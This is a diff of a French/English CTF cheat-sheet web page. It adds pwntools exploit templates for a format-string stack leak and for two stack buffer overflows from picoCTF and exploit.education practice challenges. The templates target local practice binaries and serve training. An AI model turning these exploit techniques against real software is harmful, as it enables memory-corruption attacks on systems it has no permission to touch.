@@ -91,8 +91,24 @@
 </head>
 <body>
 <div id="home"><a href="https://tic.sh">[ tic.sh ]</a></div>
-<h1 id="ctf-tricks">CTF Tricks</h1>
-<h2 id="tech-tricks-cheat-sheet">Tech Tricks (cheat sheet)</h2>
+<h1 id="tips-tricks-ctf">Tips &amp; Tricks : CTF</h1>
+<p style="text-align: right">
+<em>- last update 17/09/2021 -</em>
+</p>
+<p>Cet article est voué à évoluer régulièrement. Il me permet de regrouper les quelques informations que je juge intéressantes à propos de la résolution de CTF. Les techniques qu’il explose sont très peu détaillées, mais cette page a pour objectif d’être la plus synthétique possible pour être parcouru rapidement pendant les compétitions.</p>
+<h2 id="summary">Summary</h2>
+<ul>
+<li><a href="#cheat-sheet">Cheat Sheet</a>
+<ul>
+<li><a href="#c-lang">C (lang)</a></li>
+<li><a href="#python-3">Python 3</a></li>
+</ul></li>
+<li><a href="#examples">Examples</a>
+<ul>
+<li><a href="#pwntools-templates">Pwntools Templates</a></li>
+</ul></li>
+</ul>
+<h2 id="cheat-sheet">Cheat Sheet</h2>
 <h3 id="c-lang">C (lang)</h3>
 <p>The format string to <code>printf</code> a byte without missing any <em>“0”</em> is: <code>%08x</code></p>
 <h3 id="python-3">Python 3</h3>
@@ -102,39 +118,90 @@
 <div class="sourceCode" id="cb2"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a>sample[::<span class="op">-</span><span class="dv">1</span>]</span></code></pre></div>
 <p>Decode an valid hex string <em>(sample)</em></p>
 <div class="sourceCode" id="cb3"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="bu">bytes</span>.fromhex(sample).decode()</span></code></pre></div>
-<h3 id="pnwtools">Pnwtools</h3>
-<p>Template classique pour un exploit de format string</p>
-<div class="sourceCode" id="cb4"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/python</span></span>
-<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
-<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="co">#conn = remote(&#39;chall.ctf.net&#39;, 27912)</span></span>
-<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>conn <span class="op">=</span> process(<span class="st">&#39;./a.out&#39;</span>)</span>
-<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">&quot;1&quot;</span> <span class="op">+</span> beacon <span class="op">+</span> <span class="st">&quot;</span><span class="sc">%08x</span><span class="st">&quot;</span> <span class="op">*</span> <span class="dv">30</span></span>
-<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a>conn.sendline(payload)</span>
-<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a>line <span class="op">=</span> <span class="st">&quot;&quot;</span></span>
-<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> <span class="kw">not</span> beacon <span class="kw">in</span> line:</span>
-<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a>    line <span class="op">=</span> conn.recvline().decode()</span>
-<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a>extract <span class="op">=</span> line[<span class="bu">len</span>(beacon):]</span>
-<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> octets <span class="kw">in</span> [ extract[i:i<span class="op">+</span><span class="dv">8</span>] <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">0</span>, <span class="bu">len</span>(extract), <span class="dv">8</span>) ]:</span>
-<span id="cb4-19"><a href="#cb4-19" aria-hidden="true" tabindex="-1"></a>  <span class="cf">try</span> :</span>
-<span id="cb4-20"><a href="#cb4-20" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(octets, <span class="st">&quot;-&quot;</span>, <span class="bu">bytes</span>.fromhex(octets).decode()[::<span class="op">-</span><span class="dv">1</span>])</span>
-<span id="cb4-21"><a href="#cb4-21" aria-hidden="true" tabindex="-1"></a>  <span class="cf">except</span> :</span>
-<span id="cb4-22"><a href="#cb4-22" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(octets, <span class="st">&quot;✖&quot;</span>)</span></code></pre></div>
-<h2 id="applied">Applied</h2>
-<h3 id="format-string-injection">Format string injection</h3>
-<p>The following payload can be modified to export as many bytes as necessary / possible:</p>
-<div class="sourceCode" id="cb5"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python</span> <span class="at">-c</span> <span class="st">&#39;print(&quot;1&quot;+&quot;%08x&quot;*100)&#39;</span> <span class="kw">|</span> <span class="ex">./vulnerable</span></span></code></pre></div>
-<p>Then the output can be decoded with:</p>
-<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> b <span class="kw">in</span> [ extract[i:i<span class="op">+</span><span class="dv">8</span>] <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">0</span>, <span class="bu">len</span>(extract), <span class="dv">8</span>) ]:</span>
-<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a>  <span class="cf">try</span> :</span>
-<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(b, <span class="st">&quot;-&quot;</span>, <span class="bu">bytes</span>.fromhex(b).decode()[::<span class="op">-</span><span class="dv">1</span>])</span>
-<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>  <span class="cf">except</span> :</span>
-<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(b, <span class="st">&quot;✖&quot;</span>)</span></code></pre></div>
+<p>Decode an hex stack output (result of a format string for exemple)</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> b <span class="kw">in</span> [ extract[i:i<span class="op">+</span><span class="dv">8</span>] <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">0</span>, <span class="bu">len</span>(extract), <span class="dv">8</span>) ]:</span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>  <span class="cf">try</span> :</span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(b, <span class="st">&quot;-&quot;</span>, <span class="bu">bytes</span>.fromhex(b).decode()[::<span class="op">-</span><span class="dv">1</span>])</span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>  <span class="cf">except</span> :</span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(b, <span class="st">&quot;✖&quot;</span>)</span></code></pre></div>
+<h2 id="examples">Examples</h2>
+<h3 id="pwntools-templates">Pwntools Templates</h3>
+<p><strong>Important:</strong> <a href="https://docs.pwntools.com/en/stable/">documentation</a></p>
+<p>Template classique pour un exploit de format string (solves <a href="https://play.picoctf.org/practice/challenge/105">picoctf#105</a>)</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/python</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="co">#conn = remote(&#39;chall.ctf.net&#39;, 27912)</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>conn <span class="op">=</span> process(<span class="st">&#39;./a.out&#39;</span>)</span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">&quot;1&quot;</span> <span class="op">+</span> beacon <span class="op">+</span> <span class="st">&quot;</span><span class="sc">%08x</span><span class="st">&quot;</span> <span class="op">*</span> <span class="dv">30</span></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>conn.sendline(payload)</span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>line <span class="op">=</span> <span class="st">&quot;&quot;</span></span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> <span class="kw">not</span> beacon <span class="kw">in</span> line:</span>
+<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a>    line <span class="op">=</span> conn.recvline().decode()</span>
+<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a>extract <span class="op">=</span> line[<span class="bu">len</span>(beacon):]</span>
+<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> octets <span class="kw">in</span> [ extract[i:i<span class="op">+</span><span class="dv">8</span>] <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">0</span>, <span class="bu">len</span>(extract), <span class="dv">8</span>) ]:</span>
+<span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a>  <span class="cf">try</span> :</span>
+<span id="cb5-20"><a href="#cb5-20" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(octets, <span class="st">&quot;-&quot;</span>, <span class="bu">bytes</span>.fromhex(octets).decode()[::<span class="op">-</span><span class="dv">1</span>])</span>
+<span id="cb5-21"><a href="#cb5-21" aria-hidden="true" tabindex="-1"></a>  <span class="cf">except</span> :</span>
+<span id="cb5-22"><a href="#cb5-22" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(octets, <span class="st">&quot;✖&quot;</span>)</span></code></pre></div>
+<p>Template for feeding a process in search of the right output (solves <a href="https://exploit.education/phoenix/stack-one/">exploit-education#1</a>)</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/python</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> struct</span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a>probes <span class="op">=</span> [</span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;a.out: specify an argument, to be copied into the &quot;buffer&quot;&#39;</span>,</span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;Getting closer! changeme is currently 0x00000000, we want 0x496c5962&#39;</span>,</span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;Getting closer! changeme is currently 0x00000049, we want 0x496c5962&#39;</span>,</span>
+<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;Getting closer! changeme is currently 0x0000496c, we want 0x496c5962&#39;</span>,</span>
+<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;Getting closer! changeme is currently 0x00496c59, we want 0x496c5962&#39;</span>,</span>
+<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a>]</span>
+<span id="cb6-13"><a href="#cb6-13" aria-hidden="true" tabindex="-1"></a>target <span class="op">=</span> struct.pack(<span class="st">&quot;I&quot;</span>, <span class="bn">0x496c5962</span>)</span>
+<span id="cb6-14"><a href="#cb6-14" aria-hidden="true" tabindex="-1"></a>result <span class="op">=</span> probes[<span class="dv">0</span>]</span>
+<span id="cb6-15"><a href="#cb6-15" aria-hidden="true" tabindex="-1"></a>cmpt <span class="op">=</span> <span class="dv">0</span></span>
+<span id="cb6-16"><a href="#cb6-16" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-17"><a href="#cb6-17" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> result <span class="kw">in</span> probes:</span>
+<span id="cb6-18"><a href="#cb6-18" aria-hidden="true" tabindex="-1"></a>    payload <span class="op">=</span> b<span class="st">&quot;a&quot;</span> <span class="op">*</span> cmpt <span class="op">+</span> target</span>
+<span id="cb6-19"><a href="#cb6-19" aria-hidden="true" tabindex="-1"></a>    conn <span class="op">=</span> process([<span class="st">&#39;./a.out&#39;</span>, payload])</span>
+<span id="cb6-20"><a href="#cb6-20" aria-hidden="true" tabindex="-1"></a>    conn.readline()</span>
+<span id="cb6-21"><a href="#cb6-21" aria-hidden="true" tabindex="-1"></a>    result <span class="op">=</span> conn.readline().decode().strip()</span>
+<span id="cb6-22"><a href="#cb6-22" aria-hidden="true" tabindex="-1"></a>    cmpt <span class="op">+=</span> <span class="dv">1</span></span>
+<span id="cb6-23"><a href="#cb6-23" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(result)</span>
+<span id="cb6-24"><a href="#cb6-24" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(cmpt, payload)</span></code></pre></div>
+<p>Automatic payload creation :</p>
+<ul>
+<li>Using <code>cyclic</code> to find a vulnerable buffer size</li>
+<li>Using <code>ELF.symbols</code> to look for a function’s pointer address</li>
+</ul>
+<p>(solves <a href="https://exploit.education/phoenix/stack-three/">exploit-education#3</a></p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/python</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> struct</span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>conn <span class="op">=</span> process(<span class="st">&#39;./a.out&#39;</span>)</span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> cyclic(<span class="dv">100</span>)</span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(conn.recvline())</span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a>conn.sendline(payload)</span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a>extract <span class="op">=</span> conn.recvline().decode().strip().split(<span class="st">&#39;x&#39;</span>)[<span class="dv">1</span>]</span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a>offset <span class="op">=</span> cyclic_find(<span class="bu">bytes</span>.fromhex(extract).decode()[:<span class="dv">4</span>])</span>
+<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a>e <span class="op">=</span> ELF(<span class="st">&#39;./a.out&#39;</span>)</span>
+<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="bu">hex</span>(e.symbols[<span class="st">&#39;complete_level&#39;</span>]))</span>
+<span id="cb7-15"><a href="#cb7-15" aria-hidden="true" tabindex="-1"></a>target <span class="op">=</span> p32(e.symbols[<span class="st">&#39;complete_level&#39;</span>])</span>
+<span id="cb7-16"><a href="#cb7-16" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-17"><a href="#cb7-17" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> cyclic(offset <span class="op">-</span> <span class="dv">1</span>) <span class="op">+</span> target</span>
+<span id="cb7-18"><a href="#cb7-18" aria-hidden="true" tabindex="-1"></a>conn <span class="op">=</span> process(<span class="st">&#39;./a.out&#39;</span>)</span>
+<span id="cb7-19"><a href="#cb7-19" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(conn.recvline().decode())</span>
+<span id="cb7-20"><a href="#cb7-20" aria-hidden="true" tabindex="-1"></a>conn.sendline(payload)</span>
+<span id="cb7-21"><a href="#cb7-21" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(conn.recvline().decode())</span>
+<span id="cb7-22"><a href="#cb7-22" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(conn.recvline().decode())</span></code></pre></div>
 </body>
 </html>
